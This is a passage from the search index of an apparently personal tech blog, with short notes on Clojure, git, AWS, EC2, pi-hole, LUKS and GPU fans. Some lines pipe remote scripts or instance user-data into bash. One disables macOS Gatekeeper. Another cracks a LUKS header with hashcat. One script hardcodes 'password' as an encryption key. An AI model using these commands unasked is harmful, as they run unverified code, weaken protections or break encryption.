duplicates and can be denoted with #{} Because of the nature of the set, we get a few extra methods to use on them, union difference and intersection.","title":"Clojure 3"},{"content":"Iterm Clipboard Apparently there has been an option sitting in iTerm that will allow applications in the terminal to access the system clipboard and somehow I never knew about this?!? Inside the preferences-General menu there is a setting called \u0026ldquo;Selection\u0026rdquo; and then an option \u0026ldquo;Applications in terminal may access clipboard\u0026rdquo; This is life changing and certainly makes a great many things much much easier https://stackoverflow.com/a/38849483\n","permalink":"https://ridingintraffic.github.io/posts/2020-06-24-clipboard/","summary":"Iterm Clipboard Apparently there has been an option sitting in iTerm that will allow applications in the terminal to access the system clipboard and somehow I never knew about this?!? Inside the preferences-General menu there is a setting called \u0026ldquo;Selection\u0026rdquo; and then an option \u0026ldquo;Applications in terminal may access clipboard\u0026rdquo; This is life changing and certainly makes a great many things much much easier https://stackoverflow.com/a/38849483","title":"Clipboard"},{"content":"Clojure I am trying to learn clojure, therefore the best way that I know how to learn something is to write about it. This allows me to digest the things that I am learning. Apparently I had forgotten about this tactic for the past couple weeks, as I was trying to just read and do problems to help learn this. Therefore lets get started.\nNOTE: I am writing this as a way to digest and understand the book that I am working through entitled. Living Clojure\nWhat? What is clojure and why do I care? Clojure is a lisp that is sitting on op of a JVM. It is a functional programming language. What is a functional programming language? \u0026hellip;functional programming is a programming paradigm where programs are constructed by applying and composing functions. It is a declarative programming paradigm in which function definitions are trees of expressions that each return a value, rather than a sequence of imperative statements which change the state of the program or world. https://en.wikipedia.org/wiki/Functional_programming Functional programming is a real mind job if you are coming to FP from object oriented programming. This is what I am doing and it is real hard to make my brain think this way. However if you have already dabbled in say terraform some, then the declarative world may not be completely new. So we have that going for us.\nGetting started Once we have clojure installed follow whatever install guide you would like. https://clojure.org/guides/getting_started or brew install clojure/tools/clojure We will now have the ability to launch a clojure REPL : read–eval–print loop. This acts much like a python interpreter or even a command line. We will start there.\n$ lein repl ... user=\u0026gt; 42 42 user=\u0026gt; (+ 1 1) 2 I typed in just the number 42 and hit enter, this gave me an integer back out, cool easy enough Next I did a basic function call (+ 1 1) which added 1 and 1 together, then it returned 2. Easy enough although that syntax is super weird, but that is just the world we are living in.\nWhat else is weird? ratios Ratios are not broken down to decimals The \u0026ldquo;mathing\u0026rdquo; will be done if it can result in integers, but anything else it won\u0026rsquo;t do. For example:\nuser=\u0026gt; 1/3 1/3 user=\u0026gt; 4/2 2 user=\u0026gt; 13/1 13 user=\u0026gt; 13/2 13/2 user=\u0026gt; 6.0/3 Syntax error reading source at (REPL:1:1). Invalid number: 6.0/3 user=\u0026gt; (/ 1 3) 1/3 We can see that the 1/3 stays 1/3 instead of .3333 Additionally we cannot mix and match decimals and whole numbers for the ratio/math, it will give an error. Even if we go as far as doing the function call for the (/ 1 3) it will still return a ratio. We can finally get it to return some repeating decimals with:\nuser=\u0026gt; (/ 1 3.0) 0.3333333333333333 yey!!\nStrings and others Strings are pretty easy we just type in a word \u0026quot;string\u0026quot; and it gives us a string Additionally keywords are done with :myKeyWord Booleans are the same way true and false :w\nCollections Here we are getting in to the something more interesting Collections! List collection:\nuser=\u0026gt; \u0026#39;(1 2 \u0026#34;face\u0026#34; :something-else) (1 2 \u0026#34;face\u0026#34; :something-else) We can ignore using commas or we can use them. The ignoring of the commas is known a idiomatic.\nWhat is idiomatic? Using, containing, or denoting expressions that are natural to a native speaker. ‘distinctive idiomatic dialogue’ https://www.lexico.com/en/definition/idiomatic Otherwise known as you can use commas but it is idiomatic not to, alright sure fine. We can access the first element of a list by using first \u0026lt;list\u0026gt; and then the rest of the list, or NOT the first with rest \u0026lt;list\u0026gt; simple right? Once we get to the end of the list, it will return a nil. We can build the list with cons \u0026lt;element-to-add\u0026gt; \u0026lt;list-name\u0026gt;\nuser=\u0026gt; (cons 5 `()) (5) Alright that is where I am going to have to stop for tonight but tomorrow I will pick up with vectors.\nGood luck\nLinks and notes: clojure cheatsheet - http://jafingerhut.github.io/cheatsheet/clojuredocs/cheatsheet-use-title-attribute-no-cdocs-summary.html\n","permalink":"https://ridingintraffic.github.io/posts/2020-06-23-clojure-1/","summary":"Clojure I am trying to learn clojure, therefore the best way that I know how to learn something is to write about it. This allows me to digest the things that I am learning. Apparently I had forgotten about this tactic for the past couple weeks, as I was trying to just read and do problems to help learn this. Therefore lets get started.\nNOTE: I am writing this as a way to digest and understand the book that I am working through entitled.","title":"Clojure 1"},{"content":"ssm rate limiting I was spending a little bit of time trying to scrape some ssm stuff and i figured out that there seems to be a \u0026ldquo;feature\u0026rdquo; built in to ssm that doesn\u0026rsquo;t let you do too many describes. AWS will complain and say NO BUENO if you do it to often.\naws ssm describe-parameters | jq \u0026#39;.Parameters[]| \u0026#34;\\(.Name) \\(.Type)\u0026#34;\u0026#39; An error occurred (ThrottlingException) when calling the DescribeParameters operation (reached max retries: 2): Rate exceeded I thought that was kind of a nice thing to stop people from describe everythign too often. It can be seen as a security feature as well.\n","permalink":"https://ridingintraffic.github.io/posts/2020-05-08-ssm-scraping/","summary":"ssm rate limiting I was spending a little bit of time trying to scrape some ssm stuff and i figured out that there seems to be a \u0026ldquo;feature\u0026rdquo; built in to ssm that doesn\u0026rsquo;t let you do too many describes. AWS will complain and say NO BUENO if you do it to often.\naws ssm describe-parameters | jq \u0026#39;.Parameters[]| \u0026#34;\\(.Name) \\(.Type)\u0026#34;\u0026#39; An error occurred (ThrottlingException) when calling the DescribeParameters operation (reached max retries: 2): Rate exceeded I thought that was kind of a nice thing to stop people from describe everythign too often.","title":"playing with ssm"},{"content":"using multiple .gitconfig There is a neat feature in .gitconfig that will allow you to use uniueq gitconfig depending on the folder structure that you have.\nFor example add this to your global gitconfig: This is assuming that ~/github has one org of repos, and ~/git has another, much lke personal and corporate git repos\n[includeIf \u0026#34;gitdir:~/git/\u0026#34;] path = ~/git/.gitconfig [includeIf \u0026#34;gitdir:~/github/\u0026#34;] path = ~/github/.gitconfig Then if you add this is the correpsonding location, the user name/email will be different in each folder structure.\n[user] name = userid email = corporate@email.com [core] hooksPath = ~/git/.git-hooks Thanks to this article in explaining it. setup-git-with-multiple-configs\n","permalink":"https://ridingintraffic.github.io/posts/2020-04-30-unique--gitconfig/","summary":"using multiple .gitconfig There is a neat feature in .gitconfig that will allow you to use uniueq gitconfig depending on the folder structure that you have.\nFor example add this to your global gitconfig: This is assuming that ~/github has one org of repos, and ~/git has another, much lke personal and corporate git repos\n[includeIf \u0026#34;gitdir:~/git/\u0026#34;] path = ~/git/.gitconfig [includeIf \u0026#34;gitdir:~/github/\u0026#34;] path = ~/github/.gitconfig Then if you add this is the correpsonding location, the user name/email will be different in each folder structure.","title":"unique .gitconfig"},{"content":"BFG local cleanup This is a thing that you can do to clean up your local git repo AFTER doing a commit and before pushing to origin.\nPREWORK Download BFG.jar https://rtyley.github.io/bfg-repo-cleaner/ https://repo1.maven.org/maven2/com/madgag/bfg/1.13.0/bfg-1.13.0.jar Create directory structure mkdir -p ~/.binaries/ Move BFG into place, chmod it\nmv bfg-1.13.0.jar ~/.binaries/ \u0026amp;\u0026amp; chmod 777 ~/.binaries/bfg-1.13.0.jar setup BASH_PROFILE echo \u0026#39;alias bfg=\u0026#34;java -jar ~/.binaries/bfg-1.13.0.jar\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile echo \u0026#34;export PATH=/Users/$(whoami)/.binaries:$PATH\u0026#34; \u0026gt;\u0026gt; ~/.bash_profile source it source ~/.bash_profile Cleaning repo with BFG Now what do we do.\nI will create a new folder, and then create a git repo in that folder.\nThis would be the same as doing a git clone\u0026hellip;\nmkdir testing-bfg\ncd testing-bfg/\ngit init\nvi README.md # do things # do things that are bad git add README.md\ngit co -a -m \u0026quot;I did an inital commit and it is bad\u0026quot;\ngit push origin master *** pre-receive hook fires and stops me from pushing, so the push fails. OR I don\u0026#39;t push, but the commit is already in my history, I need to clean it. This is how you fix it.\nIn order for BFG to run properly you cannot run it from the source of your git repo, you need to be at least out by one folder.\ncd ../\nvi ~/my-mess #this file is now located at your home folder as denoted by the ~/ thingy #my-mess file # these are the strings that you want out of your repo and commit history AWS_TOKEN=X1V34 PASSWORD= Now we have our dirty git repo located at testing-bfg.\nWe also have a text file with the \u0026ldquo;things we want to remove from the repo\u0026rdquo; that is located at ~/my-mess\nWe are going to run the bfg command which is aliased to bfg but you could also do this without the alias, java -jar bfg-1.13.0.jar The --no-blob-protection is telling bfg to rewrite my current history in all my branches and make clean.\nbfg --replace-text ~/my-mess testing-bfg/ --no-blob-protection Now you will have your file in a \u0026ldquo;modified\u0026rdquo; state according to git.\nThis is because your local file still has the BAD words in it, however your commit history does not. Therefore it is considered modified.\nNow, go through and change your local file to fix your shame and do a new commit and move forward.\nPROFIT\n","permalink":"https://ridingintraffic.github.io/posts/2020-02-28-bfg-local-cleanup/","summary":"BFG local cleanup This is a thing that you can do to clean up your local git repo AFTER doing a commit and before pushing to origin.\nPREWORK Download BFG.jar https://rtyley.github.io/bfg-repo-cleaner/ https://repo1.maven.org/maven2/com/madgag/bfg/1.13.0/bfg-1.13.0.jar Create directory structure mkdir -p ~/.binaries/ Move BFG into place, chmod it\nmv bfg-1.13.0.jar ~/.binaries/ \u0026amp;\u0026amp; chmod 777 ~/.binaries/bfg-1.13.0.jar setup BASH_PROFILE echo \u0026#39;alias bfg=\u0026#34;java -jar ~/.binaries/bfg-1.13.0.jar\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile echo \u0026#34;export PATH=/Users/$(whoami)/.binaries:$PATH\u0026#34; \u0026gt;\u0026gt; ~/.bash_profile source it source ~/.bash_profile Cleaning repo with BFG Now what do we do.","title":"bfg clean local"},{"content":"Turn off signed aps in mac I don\u0026rsquo;t want the security warning for unsigned apps. You can do this with this command on a mac.\nsudo spctl --master-disable\nThis is terrible and prolly shouldn\u0026rsquo;t be done, but you know sometimes you need to.\nYou can also yank things out of quarantine with this\nxattr -r -d com.apple.quarantine /path/to/dir\n","permalink":"https://ridingintraffic.github.io/posts/2020-03-18-live-dangerously/","summary":"Turn off signed aps in mac I don\u0026rsquo;t want the security warning for unsigned apps. You can do this with this command on a mac.\nsudo spctl --master-disable\nThis is terrible and prolly shouldn\u0026rsquo;t be done, but you know sometimes you need to.\nYou can also yank things out of quarantine with this\nxattr -r -d com.apple.quarantine /path/to/dir","title":"live dangerously"},{"content":"AWS credential_process There is a setting in the aws config that allows AWS to source the credentials externally. This can be super handy if you don\u0026rsquo;t want to store those as plain text things.\nIt is called \u0026ldquo;credential process\u0026rdquo;. We can use this in conjunction with native openssl to give you a poor mans encrypted aws keys.\nhttps://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sourcing-external.html\nFirst we will take the aws credentials and dump them to a temp file this is named key.json\n#key.json { \u0026#34;Version\u0026#34;: 1, \u0026#34;AccessKeyId\u0026#34;: \u0026#34;NOTAREALKEYID, \u0026#34;SecretAccessKey\u0026#34;: \u0026#34;NOTAREALSECRET } Next we are going to create a script called encrypt.sh, this is going to accept the file that is passed to it and then generate an encrypted file.\n#encrypt.sh openssl aes-256-cbc -a -salt -in ${1} -out ${1}.enc -k \u0026#34;password\u0026#34; Next we need to write a quick script that will decrypt the encrypted blob and just echo it out. There is a built in on openssl that does just that. Also a proper shebang at the top of the file is crucial for aws to be able to run the script properly.\n#decrypt.sh #!/bin/bash -eu #this is gonna take the encrypted file passed to it and decrypt it openssl aes-256-cbc -d -a -in $1 -k \u0026#34;password\u0026#34; Lets encrypt the file and prep it.\n$ ./encrypt.sh key.json # creates key.json.enc Next we are going to setup our aws profile to read the creds from the external process. This means that we will need to update ~/.aws/config and pass the full path of the script and the full path of the encrypted blob.\n#~/.aws/config [profile mine-encrypted] credential_process = /Users/MYUSERNAME/decrypt.sh /Users/MYUSERNAME/key.json.enc Finally we are going to tell the current session to use my new profile.\nexport AWS_PROFILE=mine-encrypted Lastly we will verify the whole process worked.\naws sts get-caller-identity ","permalink":"https://ridingintraffic.github.io/posts/2020-03-04-aws-encrypted-keys/","summary":"AWS credential_process There is a setting in the aws config that allows AWS to source the credentials externally. This can be super handy if you don\u0026rsquo;t want to store those as plain text things.\nIt is called \u0026ldquo;credential process\u0026rdquo;. We can use this in conjunction with native openssl to give you a poor mans encrypted aws keys.\nhttps://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sourcing-external.html\nFirst we will take the aws credentials and dump them to a temp file this is named key.","title":"aws encrypted keys"},{"content":"Yea it has been a long time since I wrote notes and things but I feel like there are some things to take note on.\nEC2 things of interest reading the userdata of an instance There are plenty of times that I need to see what the userdata looks like of my instance. ssh into the box. curl http://169.254.169.254/latest/user-data simple as that\ncurl http://169.254.169.254/latest/user-data #!/bin/bash .... rerunning userdata You should really never rerun userdata but if you are debugging things and need to do things. but if you want to do something terrible.\ncurl -sSL http://169.254.169.254/latest/user-data | bash ","permalink":"https://ridingintraffic.github.io/posts/2020-02-19-ec2-things/","summary":"Yea it has been a long time since I wrote notes and things but I feel like there are some things to take note on.\nEC2 things of interest reading the userdata of an instance There are plenty of times that I need to see what the userdata looks like of my instance. ssh into the box. curl http://169.254.169.254/latest/user-data simple as that\ncurl http://169.254.169.254/latest/user-data #!/bin/bash .... rerunning userdata You should really never rerun userdata but if you are debugging things and need to do things.","title":"ec2, meta-data"},{"content":"Some git notes I like git I user git a lot, I did not know about CODEOWNERS, this is a nice feature.\nautomatic PR approver to a repo Adding codeowners can allow for automatic PR approvers for branches or all things github.com about-code-owners\nYou can use a CODEOWNERS file to define individuals or teams that are responsible for code in a repository. To use a CODEOWNERS file, create a new file called CODEOWNERS in the root, docs/, or .github/ directory of the repository, in the branch where you\u0026rsquo;d like to add the code owners.\nExamples about-code-owners#example-of-a-codeowners-file\ngeneric example from github.com # \u0026lt;filename CODEOWNERS\u0026gt; # This is a comment. # Each line is a file pattern followed by one or more owners. # These owners will be the default owners for everything in # the repo. Unless a later match takes precedence, # @global-owner1 and @global-owner2 will be requested for # review when someone opens a pull request. * @global-owner1 @global-owner2 # Order is important; the last matching pattern takes the most # precedence. When someone opens a pull request that only # modifies JS files, only @js-owner and not the global # owner(s) will be requested for a review. *.js @js-owner git push origin alias gpox #short for \u0026ldquo;git push origin x\u0026rdquo; much like \u0026ldquo;git push origin master\u0026rdquo;\nIf you add this to your bash profile. IE ~/.bash_profile you can quickly and easily push to the branch that you are already in.\n# \u0026lt;filename ~/.bash_profile\u0026gt; ... alias gpox=\u0026#39;git push origin `git rev-parse --abbrev-ref HEAD`\u0026#39; then to use it you would just add a commit and make a push like this\ngit commit -a -m \u0026#34;your message\u0026#34; gpox ✔ ~/git/github/ridingintraffic/ridingintraffic.github.com [master|✔] 13:47 $ git co -a -m \u0026#34;trying to make it more clear\u0026#34; [master eb4fe26] trying to make it more clear 1 file changed, 2 insertions(+), 2 deletions(-) ✔~/git/github/ridingintraffic/ridingintraffic.github.com [master ↑·1|✔] 13:48 $ gpox Counting objects: 3, done. ..... ","permalink":"https://ridingintraffic.github.io/posts/2019-11-12-git-codeowners-gpox/","summary":"Some git notes I like git I user git a lot, I did not know about CODEOWNERS, this is a nice feature.\nautomatic PR approver to a repo Adding codeowners can allow for automatic PR approvers for branches or all things github.com about-code-owners\nYou can use a CODEOWNERS file to define individuals or teams that are responsible for code in a repository. To use a CODEOWNERS file, create a new file called CODEOWNERS in the root, docs/, or .","title":"git codeowners gpox"},{"content":"need moar ebs AWS EBS volumes. Yes I know that everything in AWS should be immutable and disposable. But sometimes they aren\u0026rsquo;t. We don\u0026rsquo;t need to go into the philosophical rammifcations of that what we need is a fix. First we find the instance, then the volume, then we grow the volume in aws, then we grow the volume on the box\nLets go and describe the instance\n$ aws ec2 describe-instances --filters Name=tag:Name,Values=\u0026#39;MyMagicServer\u0026#39; | jq \u0026#39;.Reservations[].Instances\u0026#39; |jq \u0026#39;map({ id: .InstanceId, ip: (.PrivateIpAddress // \u0026#34;\u0026lt;terminated\u0026gt;\u0026#34;), enis: [.NetworkInterfaces[].PrivateIpAddress], devicename: [.BlockDeviceMappings[].DeviceName], VolumeId: [.BlockDeviceMappings[].Ebs.VolumeId], tags: (.Tags // [] | map({ key: .Key, value: .Value }) | from_entries) })\u0026#39; [ { \u0026#34;id\u0026#34;: \u0026#34;i-not-a-real-id\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;1.1.5.5.\u0026#34;, \u0026#34;enis\u0026#34;: [ \u0026#34;1.1.5.5\u0026#34; ], \u0026#34;devicename\u0026#34;: [ \u0026#34;/dev/xvda\u0026#34; ], \u0026#34;VolumeId\u0026#34;: [ \u0026#34;vol-0notarealvolume\u0026#34; ], \u0026#34;tags\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;MyMagicServer\u0026#34; } } ] great now we have the volumeId so lets see how big it is\n$ aws ec2 describe-volumes \\ --region us-east-1 \\ --filters Name=attachment.instance-id,Values=i-0notarealvolume | jq \u0026#39;.Volumes\u0026#39;| jq \u0026#39;map({ volumeId: .VolumeId, size: .Size })\u0026#39; [ { \u0026#34;volumeId\u0026#34;: \u0026#34;vol-0notarealvolume\u0026#34;, \u0026#34;size\u0026#34;: 100 } ] Next we will make the volume bigger\n$ aws ec2 --region us-east-1 modify-volume --size 1024 --volume-id vol-0enotarealvolume { \u0026#34;VolumeModification\u0026#34;: { \u0026#34;TargetIops\u0026#34;: 3072, \u0026#34;TargetSize\u0026#34;: 1024, \u0026#34;Progress\u0026#34;: 0, \u0026#34;ModificationState\u0026#34;: \u0026#34;modifying\u0026#34;, \u0026#34;StartTime\u0026#34;: \u0026#34;2019-08-20T18:42:21.000Z\u0026#34;, \u0026#34;TargetVolumeType\u0026#34;: \u0026#34;gp2\u0026#34;, \u0026#34;OriginalVolumeType\u0026#34;: \u0026#34;gp2\u0026#34;, \u0026#34;OriginalSize\u0026#34;: 100, \u0026#34;VolumeId\u0026#34;: \u0026#34;vol-0enotarealvolume\u0026#34;, \u0026#34;OriginalIops\u0026#34;: 300 } } Next we will need to go to the box and grow the volume\nssh in to the box verify the size\n$ ssh ec2-user@1.1.5.5 $ sudo su [root@ip-1-1-5-5 ec2-user]# df -h Filesystem Size Used Avail Use% Mounted on /dev/xvda1 99G 21G 78G 22% / devtmpfs 15G 60K 15G 1% /dev tmpfs 15G 0 15G 0% /dev/shm issue the command growpart /dev/xvda 1\n[root@ip-1-1-5-5 ec2-user]# growpart /dev/xvda 1 CHANGED: disk=/dev/xvda partition=1: start=4096 old: size=209711070,end=209715166 new: size=2147479518,end=2147483614 issue the command resize2fs /dev/xvda1\n[root@ip-1-1-5-5 ec2-user]# resize2fs /dev/xvda1 resize2fs 1.42.12 (29-Aug-2014) Filesystem at /dev/xvda1 is mounted on /; on-line resizing required old_desc_blocks = 7, new_desc_blocks = 64 The filesystem on /dev/xvda1 is now 268434939 (4k) blocks long. verify the size\n[root@ip-1-1-5-5 ec2-user]# df -h Filesystem Size Used Avail Use% Mounted on /dev/xvda1 1008G 21G 987G 3% / devtmpfs 15G 60K 15G 1% /dev tmpfs 15G 0 15G 0% /dev/shm profit\n","permalink":"https://ridingintraffic.github.io/posts/2019-08-20-ebs-grow/","summary":"need moar ebs AWS EBS volumes. Yes I know that everything in AWS should be immutable and disposable. But sometimes they aren\u0026rsquo;t. We don\u0026rsquo;t need to go into the philosophical rammifcations of that what we need is a fix. First we find the instance, then the volume, then we grow the volume in aws, then we grow the volume on the box\nLets go and describe the instance\n$ aws ec2 describe-instances --filters Name=tag:Name,Values=\u0026#39;MyMagicServer\u0026#39; | jq \u0026#39;.","title":"ebs grow"},{"content":"Virtualbox shared clipboard When using virtualbox it is pretty important that you are going to want to have a shared clipboard between your machine and the vm. This can be done for linux/kali linux by doing the following.\nStart VirtualBox. Start the host in question. Once the host has booted, click Devices | Insert Guest Additions CD Image. Open up a terminal window in the guest. Mount the CD-ROM with the command sudo mount /dev/cdrom /mnt. Change into the mounted directory with the command cd /mnt. Install the Guest Additions package with the command ./VBoxLinuxAdditions.run Retart the VM, and once it\u0026#39;s booted, click Devices | Shared Clipboard | Bidirectional there you have it quick and easy and now the vm is good to go.\nripgrep latest So i am starting to have to flesh out my linux dot files in a way that will allow me to configure my terminal and shell quickly and easily when i am dropping into various VMs and other machines that are often getting wiped out and reimaged all the time\u0026hellip; The easiest way to do this is with a whole bunch of dot files and then some bash sripts to configure when once i pull down the repo. One of my tools is ripgrep so i needed to come up with a way to get latest release of it and then install it\u0026hellip; This is one way but I am sure there are others\nrg_tag=$(curl --silent \u0026#34;https://api.github.com/repos/BurntSushi/ripgrep/releases/latest\u0026#34; |grep \u0026#39;\u0026#34;tag_name\u0026#34;:\u0026#39; | sed -E \u0026#39;s/.*\u0026#34;([^\u0026#34;]+)\u0026#34;.*/\\1/\u0026#39; ) curl -LO https://github.com/BurntSushi/ripgrep/releases/download/\u0026#34;$rg_tag\u0026#34;/ripgrep_\u0026#34;$rg_tag\u0026#34;_amd64.deb sudo dpkg -i ripgrep_\u0026#34;$rg_tag\u0026#34;_amd64.deb https://github.com/BurntSushi/ripgrep/releases/download/0.10.0/ripgrep_0.10.0_amd64.deb\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-30-virtualbox-shared-clipboard_ripgrep-install/","summary":"Virtualbox shared clipboard When using virtualbox it is pretty important that you are going to want to have a shared clipboard between your machine and the vm. This can be done for linux/kali linux by doing the following.\nStart VirtualBox. Start the host in question. Once the host has booted, click Devices | Insert Guest Additions CD Image. Open up a terminal window in the guest. Mount the CD-ROM with the command sudo mount /dev/cdrom /mnt.","title":"virtualbox shared clipboard and ripgrep install"},{"content":"pi-hole Well i had tried to use pi-hole before and it failed horribly. Tonight on the other hand, I just wiped a pi and installed an sdcard, ran a simple script and all the magic was done for me\u0026hellip; So I guess I might have to use this after all\u0026hellip;. I am also going to do some research on automating the maintaince of it to make sure the block lists are also up to date and whatnot. I think i might have to write a blog post about this one next, its pretty easy but it needs a little bit more meat than what I just did. But really what it comes down to is\ninstall raspbian lite setup ssh change hostname set static ip on router run curl -sSL https://install.pi-hole.net | bash follow the prompts and get everything turned on. pay attention to the last screen if you enabled the admin web page, it will give oyu the password when you miss that page, ssh into the pihole and reset the password for the admin page with $ pihole -a -p Enter New Password (Blank for no password): setup your laptop to use the dns server ip of the pi hole OR setup your router to use the dns server ip of the pi hole done install-pi-hole luks tweak. I recieved some feedback on my luks cracking article about the header size. there was an extra command added to my gist that will identify exactly how big the header should be and therefore how much data is going to be needed to be copied. $ cryptsetup luksDump test | grep \u0026quot;Payload offset\u0026quot; # add 1 to the offset value that comes back\nnow all the commands are\n$ dd if=/dev/urandom of=test bs=1M count=100 $ cryptsetup luksFormat test #use password password $ cryptsetup luksOpen test tmp $ xxd -l 512 /dev/mapper/tmp # is random data at this point $ mkfs.ext4 /dev/mapper/tmp # use the same file system that is used by your system/device $ xxd -l 512 /dev/mapper/tmp # should no longer be random data $ cryptsetup luksClose tmp $ cryptsetup luksDump test | grep \u0026#34;Payload offset\u0026#34; # add 1 to the offset value that comes back $ dd if=test of=luks-header bs=512 count=4097 # grabs header $ echo \u0026#34;password\u0026#34; \u0026gt;\u0026gt;list $ hashcat -m 14600 -a 0 -w 3 luks-header list -o found or the link to the gist is : luks-gist\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-28-pihole-and-luks-update/","summary":"pi-hole Well i had tried to use pi-hole before and it failed horribly. Tonight on the other hand, I just wiped a pi and installed an sdcard, ran a simple script and all the magic was done for me\u0026hellip; So I guess I might have to use this after all\u0026hellip;. I am also going to do some research on automating the maintaince of it to make sure the block lists are also up to date and whatnot.","title":"pihole and luks update"},{"content":"fun with rsync Sometimes you jsut gotta back up files as clones, to another location. On a mac you have access to rsync and it is avaialbe in homebrew. brew install rsync wait for completion and then you are good to go. Alright so how about some commands..\ncopy from local to usb rsync -av /Users/$(whoami)/Documents/ /Volumes/1tb/backup/\ncopy from nas to usb rsync -av /Volumes/files/data/ /Volumes/1tb/backup/\nmac will mount nas shares in the share name and then in volumes, so this is reliant on that mount being present when you want to pull something down from said nas. Not a big deal but it should be noted.\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-26-fun-with-rsync/","summary":"fun with rsync Sometimes you jsut gotta back up files as clones, to another location. On a mac you have access to rsync and it is avaialbe in homebrew. brew install rsync wait for completion and then you are good to go. Alright so how about some commands..\ncopy from local to usb rsync -av /Users/$(whoami)/Documents/ /Volumes/1tb/backup/\ncopy from nas to usb rsync -av /Volumes/files/data/ /Volumes/1tb/backup/\nmac will mount nas shares in the share name and then in volumes, so this is reliant on that mount being present when you want to pull something down from said nas.","title":"fun with rsync"},{"content":"books Everyone like to read things right? well I came across this list from palo alto earlier and it looks pretty promising. cybercanon.paloaltonetworks There area whole bunch of books in there raning from security to chaos engineering. Down the chaos engineering rabbit hole we go checkout this list of chaos engineering everything here awesome-chaos-engineering\nwhat is chaos engineering? It is using the ideas that the systems that we create now are so complex and dense. We are engineering the methods that will allow for random services and pieces to fail at random intervals. Then if the systems are resilient enough, they should have self healing or fault tolerance built it. if that is the case then the overall picture will all the system to function on some level, even when random components and interfaces are brought down unexpectedly. This is all only possible if the systems themselves are in a measurable and steady state. If you don\u0026rsquo;t know what is healthy and have a means to measure healthy then it is going to be double tough to measure and understand unhealthy. Then the second part as stated before is the ability for the systems to self heal and rebuild things on their own. that is the extra complex part.\ndocker and python I needed to play with a python library and I hate installing things on my laptop and then leaving cruft around. Using docker we can do a quick and dirty test of software. Lets pull down a docker image that has python in it real quick. docker pull python:3.7.1-stretch then we can run it and get a shell docker run --rm -it python:3.7.1-stretch /bin/bash boom we are in , next quick fix apt-get update \u0026amp;\u0026amp; apt-get install -y vim that will update the repos and give us vi so we can start writing stuff. then the image already has git so go snag the python library that you wanted to mess with pull down the repo then run python setup.py install get it configured and we can either build a python script in vim or drop into a python interactive terminal. Done, throw away the garbage when your done. If you needed to save the stuff you were working on you can always volume mount and have your files out of the continer.\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-21-book-list_chaos-engineering_docker-python/","summary":"books Everyone like to read things right? well I came across this list from palo alto earlier and it looks pretty promising. cybercanon.paloaltonetworks There area whole bunch of books in there raning from security to chaos engineering. Down the chaos engineering rabbit hole we go checkout this list of chaos engineering everything here awesome-chaos-engineering\nwhat is chaos engineering? It is using the ideas that the systems that we create now are so complex and dense.","title":"book list, chaos engineering and docker with python"},{"content":"nvidia fan settings Nvida gpu cards have firmware regulators in place that are OK with the cards running at 85c when they are under load. This is designed because of the assumption that the cards will only ever be under that kind of load for a short period. However when you want to run gpu\u0026rsquo;s at 100% utilization for an extended period it is often better to run these cards colder. Nvidia lets us take control of the fans and override the fan speed. Lets do that.\nHeadless server Odds are the build that we are working with is going to have many cards and it is going to be configured in a headless setup. This introduces a little bit of a headache, but we can solve this. With an X server a nice xorg config and built in Nvidia settings\n# https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker # ^^ this is a pretty good guide but if you want better control then further steps need to be taken. # Many of the instlal guides talk about blacklisting the nouveau drivers because they cause all sorts of conflicts. # blacklist nouveau drivers # https://www.blackhillsinfosec.com/running-hashcat-on-ubuntu-18-04-server-with-1080ti/ ## black list for the win $ sudo bash -c \u0026#34;echo blacklist nouveau \u0026gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf\u0026#34; $ sudo bash -c \u0026#34;echo options nouveau modeset=0 \u0026gt;\u0026gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf\u0026#34; $ sudo update-initramfs -u In order to get nvidia settings working we need to have an x environment running\n#install lightdm $ sudo apt-get install --no-install-recommends xorg lightdm #Disable the X server from auto starting on boot. Otherwise it would cause conflicts when you try to overclock the cards later on. $ sudo systemctl disable lightdm.service #install the gtk deps $ sudo apt-get install libgtk-3-dev -y Next we are going trick the video cards into thinking they have a display plugged in, with nvidia we can do this in software, with amd we need to stick dummy plugs on them. https://bitcointalk.org/index.php?topic=2432849.0\n# this generates the xorg config that we will need to have. # for our system this is stored at /etc/X11/XF86Config $ sudo nvidia-xconfig -a --allow-empty-initial-configuration --cool-bits=31 --use-display-device=\u0026#34;DFP-0\u0026#34; --connected-monitor=\u0026#34;DFP-0\u0026#34; The next step is configuring rc.local so that it can be loaded on boot, getting our X env up and running and then spoofing the mointiors plugged in.\n#rc.local # You must start the X Server for overclocking and fan control to work sudo xinit -- /usr/bin/X -config /etc/X11/XF86Config sleep 10 export DISPLAY=:0 sleep 2 Alright now that we have everything up and running we will do this whenever we want to take over the machine and crank up the fans. Since this machine is up and running 24x7 we don\u0026rsquo;t want to just leave the gpu fans spinning at max. If we were to do this the fans would eventually burn out and thats no good\n# GPUFanControlState=1 gives us manual control over the fans, you can do this on a per card basis with -a [gpu:0]/GPUFanControlState=1 or just all of them this way # GPUTargetFanSpeed=95 sets the fan to spin at 95%, you can change this to 100 if needed. $ nvidia-settings -a GPUFanControlState=1 -a GPUTargetFanSpeed=95 # confirm it all worked by viewing fan settings $ nvidia-settings -q all | grep GPUTargetFanSpeed Alright now everything is blasting the cold air on the cards we can run hashcat or whatever else is going to\nreset fan control let firmware handle it nvidia-settings -a GPUFanControlState=0 nvidia-settings -a [gpu:#]/GPUTargetFanSpeed=95 ","permalink":"https://ridingintraffic.github.io/posts/2018-11-15-nvidia-fancontrol/","summary":"nvidia fan settings Nvida gpu cards have firmware regulators in place that are OK with the cards running at 85c when they are under load. This is designed because of the assumption that the cards will only ever be under that kind of load for a short period. However when you want to run gpu\u0026rsquo;s at 100% utilization for an extended period it is often better to run these cards colder.","title":"hashcat with nvidia fans"},{"content":"luks encryption lets create an encrypted container and toss some data in it\u0026hellip;\n$ dd if=/dev/urandom of=test bs=1M count=100 $ cryptsetup luksFormat test #use password password $ cryptsetup luksOpen test tmp $ xxd -l 512 